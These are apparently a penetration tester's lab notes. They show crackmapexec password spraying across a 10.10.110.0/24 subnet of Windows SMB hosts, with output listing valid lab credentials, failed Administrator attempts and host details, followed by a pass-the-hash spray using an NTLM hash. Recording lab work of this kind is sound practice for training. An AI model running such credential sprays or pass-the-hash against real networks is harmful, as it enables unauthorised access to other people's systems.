```bash
┌──(kali㉿gobots)-[04Apr2024 15:38:02]-[~/SUT]
└─$ crackmapexec smb 10.10.110.0/24 -u userlist -p passwordlist
SMB         10.10.110.58    445    SQL01-HERA       [*] Windows Server 2016 Standard 14393 x64 (name:SQL01-HERA) (domain:SQL01-Hera) (signing:False) (SMBv1:True)
SMB         10.10.110.20    445    WS01-ERIS        [*] Windows 10.0 Build 18362 x64 (name:WS01-ERIS) (domain:WS01-Eris) (signing:False) (SMBv1:False)
SMB         10.10.110.3     445    DC01-PHOBOS      [*] Windows 10.0 Build 17763 x64 (name:DC01-PHOBOS) (domain:genesis.local) (signing:True) (SMBv1:False)
SMB         10.10.110.5     445    SRV01-ARTEMIS    [*] Windows 10.0 Build 17763 x64 (name:SRV01-ARTEMIS) (domain:SRV01-Artemis) (signing:False) (SMBv1:False)
SMB         10.10.110.25    445    WS02-ATHENA      [*] Windows 10.0 Build 19041 x64 (name:WS02-ATHENA) (domain:WS02-Athena) (signing:False) (SMBv1:False)
SMB         10.10.110.58    445    SQL01-HERA       [+] SQL01-Hera\test:t3st123 
SMB         10.10.110.20    445    WS01-ERIS        [+] WS01-Eris\test:t3st123 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\test:t3st123 STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\test:MeatLoaf007 STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\test:LongAgoFarAway STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\Ferus:t3st123 STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\Ferus:MeatLoaf007 STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\Ferus:LongAgoFarAway STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\Administrator:t3st123 STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\Administrator:MeatLoaf007 STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\Administrator:LongAgoFarAway STATUS_LOGON_FAILURE 
SMB         10.10.110.5     445    SRV01-ARTEMIS    [+] SRV01-Artemis\test:t3st123 
SMB         10.10.110.25    445    WS02-ATHENA      [+] WS02-Athena\test:t3st123 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [*] Windows Server 2012 R2 Standard 9600 x64 (name:WEBWIN01-APOLLO) (domain:WEBWIN01-Apollo) (signing:False) (SMBv1:True)
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\test:t3st123 STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\test:MeatLoaf007 STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\test:LongAgoFarAway STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Ferus:t3st123 STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Ferus:MeatLoaf007 STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Ferus:LongAgoFarAway STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Administrator:t3st123 STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Administrator:MeatLoaf007 STATUS_LOGON_FAILURE 
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Administrator:LongAgoFarAway STATUS_LOGON_FAILURE 

```


```bash
crackmapexec smb 10.10.110.0/24 -u zach -H 1e39f2b205ee99f16ed8dbb0b97324b1
```
![[Pasted image 20240403205038.png]]
